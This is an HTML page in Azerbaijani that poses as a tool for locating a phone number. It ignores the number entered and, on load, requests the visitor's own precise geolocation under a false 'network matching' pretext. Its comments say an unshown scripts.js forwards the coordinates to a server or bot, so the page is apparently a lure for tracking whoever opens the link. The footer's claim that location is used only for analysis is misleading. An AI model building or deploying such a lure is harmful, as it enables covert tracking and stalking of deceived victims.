<!DOCTYPE html>
<html lang="az">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover"/>
  <title>Nömrə üzrə Lokasiya Analizi</title>

  <!-- Leaflet xəritə (API açarsız) -->
  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>

  <style>
    :root{
      --bg:#0b1220;
      --card:#111827;
      --line:#1f2937;
      --muted:#9ca3af;
      --accent:#22c55e;
      --warn:#f59e0b;
      --text:#e5e7eb;
    }
    *{box-sizing:border-box}
    html,body{height:100%}
    body{
      margin:0;
      font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial;
      background:linear-gradient(180deg,#0b1220,#0f172a);
      color:var(--text);
    }
    .app{min-height:100vh;display:flex;flex-direction:column}

    .header{
      padding:14px 16px;
      padding-top:calc(14px + env(safe-area-inset-top));
      border-bottom:1px solid var(--line);
      background:rgba(17,24,39,.9);
      backdrop-filter: blur(6px);
    }
    .header h1{margin:0;font-size:18px;font-weight:800}
    .header p{margin:6px 0 0;font-size:13px;color:var(--muted)}

    .content{padding:14px;display:flex;flex-direction:column;gap:12px;flex:1}

    .card{
      background:var(--card);
      border:1px solid var(--line);
      border-radius:14px;
      padding:14px;
    }

    .row{display:flex;gap:10px}
    .field{
      flex:1;display:flex;flex-direction:column;gap:6px
    }
    .label{font-size:12px;color:var(--muted)}
    input{
      background:#0b1220;border:1px solid var(--line);
      border-radius:10px;padding:12px;color:var(--text);
      font-size:15px;outline:none
    }
    .btn{
      width:100%;padding:12px;border-radius:12px;border:none;
      background:linear-gradient(180deg,#22c55e,#16a34a);
      color:#022;font-weight:900;cursor:pointer
    }

    .status{
      display:flex;align-items:center;gap:10px;font-size:14px
    }
    .dot{
      width:10px;height:10px;border-radius:50%;
      background:var(--warn);
      box-shadow:0 0 0 0 rgba(245,158,11,.6);
      animation:pulse 1.6s infinite
    }
    .ok{background:var(--accent)}
    @keyframes pulse{
      0%{box-shadow:0 0 0 0 rgba(245,158,11,.6)}
      70%{box-shadow:0 0 0 10px rgba(245,158,11,0)}
      100%{box-shadow:0 0 0 0 rgba(245,158,11,0)}
    }

    #map{
      width:100%;height:46vh;min-height:260px;
      border-radius:12px;border:1px solid var(--line);overflow:hidden
    }

    .grid{
      display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:10px
    }
    .kv{
      background:#0b1220;border:1px solid var(--line);
      border-radius:10px;padding:10px;font-size:13px
    }
    .kv .k{color:var(--muted);font-size:12px}
    .kv .v{font-weight:700;margin-top:4px}

    .steps{
      display:flex;gap:8px;flex-wrap:wrap;margin-top:8px
    }
    .chip{
      padding:6px 10px;border-radius:999px;
      background:#0b1220;border:1px solid var(--line);
      font-size:12px;color:var(--muted)
    }
    .chip.on{color:#022;background:var(--accent);border-color:transparent}

    .foot{
      padding:10px 14px;
      padding-bottom:calc(10px + env(safe-area-inset-bottom));
      color:var(--muted);font-size:11px;border-top:1px solid var(--line)
    }
  </style>
</head>
<body>
<div class="app">
  <div class="header">
    <h1>Nömrə üzrə Lokasiya Analizi</h1>
    <p>Şəbəkə uyğunlaşdırması üçün cihaz lokasiyası tələb olunur.</p>
  </div>

  <div class="content">
    <!-- NÖMRƏ DAXİL ETMƏ -->
    <div class="card">
      <div class="row">
        <div class="field">
          <div class="label">Telefon nömrəsi</div>
          <input id="phoneInput" inputmode="tel" placeholder="+994 50 123 45 67">
        </div>
      </div>
      <div class="steps">
        <div class="chip on" id="s1">Nömrə qəbul edildi</div>
        <div class="chip" id="s2">Şəbəkə uyğunluğu</div>
        <div class="chip" id="s3">Lokasiya təsdiqi</div>
        <div class="chip" id="s4">Xəritə yerləşdirildi</div>
      </div>
    </div>

    <!-- STATUS -->
    <div class="card">
      <div class="status">
        <div class="dot" id="dot"></div>
        <div id="statusText">Lokasiya icazəsi gözlənilir…</div>
      </div>
    </div>

    <!-- XƏRİTƏ -->
    <div class="card">
      <div id="map"></div>
      <div class="grid">
        <div class="kv"><div class="k">Enlem</div><div class="v" id="lat">—</div></div>
        <div class="kv"><div class="k">Boylam</div><div class="v" id="lng">—</div></div>
        <div class="kv"><div class="k">Dəqiqlik</div><div class="v" id="acc">—</div></div>
        <div class="kv"><div class="k">Vaxt</div><div class="v" id="time">—</div></div>
      </div>
      <button class="btn" id="retry">Yenidən yoxla</button>
    </div>
  </div>

  <div class="foot">
    Qeyd: Lokasiya yalnız istifadəçi icazəsi ilə alınır və analiz məqsədlidir.
  </div>
</div>

<!-- Leaflet -->
<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>

<!-- Sənin mövcud scripts.js (server/bot inteqrasiyası) -->
<script src="./scripts.js"></script>

<script>
  let map, marker, circle;
  const dot=document.getElementById('dot');
  const st=document.getElementById('statusText');
  const s2=document.getElementById('s2'), s3=document.getElementById('s3'), s4=document.getElementById('s4');

  function setStatus(t, ok=false){
    st.textContent=t;
    dot.className='dot'+(ok?' ok':'');
  }
  function step(el){ el.classList.add('on'); }

  function initMap(lat,lng){
    if(!map){
      map=L.map('map',{zoomControl:false}).setView([lat,lng],15);
      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{attribution:'© OpenStreetMap'}).addTo(map);
    } else map.setView([lat,lng],15);
  }
  function draw(lat,lng,acc){
    if(marker) marker.remove();
    if(circle) circle.remove();
    marker=L.marker([lat,lng]).addTo(map);
    circle=L.circle([lat,lng],{radius:acc||150}).addTo(map);
  }
  function meta(lat,lng,acc){
    latEl.textContent=lat.toFixed(6);
    lngEl.textContent=lng.toFixed(6);
    accEl.textContent=acc?Math.round(acc)+' m':'—';
    const d=new Date(),p=n=>String(n).padStart(2,'0');
    timeEl.textContent=`${p(d.getDate())}.${p(d.getMonth()+1)}.${d.getFullYear()} ${p(d.getHours())}:${p(d.getMinutes())}`;
  }
  const latEl=document.getElementById('lat'),lngEl=document.getElementById('lng'),
        accEl=document.getElementById('acc'),timeEl=document.getElementById('time');

  function requestLocation(){
    setStatus('Lokasiya icazəsi soruşulur…');
    if(!('geolocation' in navigator)){ setStatus('Lokasiya dəstəklənmir'); return; }
    navigator.geolocation.getCurrentPosition(
      pos=>{
        const {latitude,longitude,accuracy}=pos.coords;
        step(s2); step(s3);
        setStatus('Lokasiya tapıldı',true);
        initMap(latitude,longitude);
        draw(latitude,longitude,accuracy);
        meta(latitude,longitude,accuracy);
        step(s4);
        // scripts.js bu nöqtədə serverə/bota göndərməni edir
      },
      ()=> setStatus('Lokasiya əldə edilmədi'),
      {enableHighAccuracy:true,timeout:8000,maximumAge:0}
    );
  }

  document.getElementById('retry').addEventListener('click', requestLocation);
  window.addEventListener('DOMContentLoaded', requestLocation);
</script>
</body>
</html>
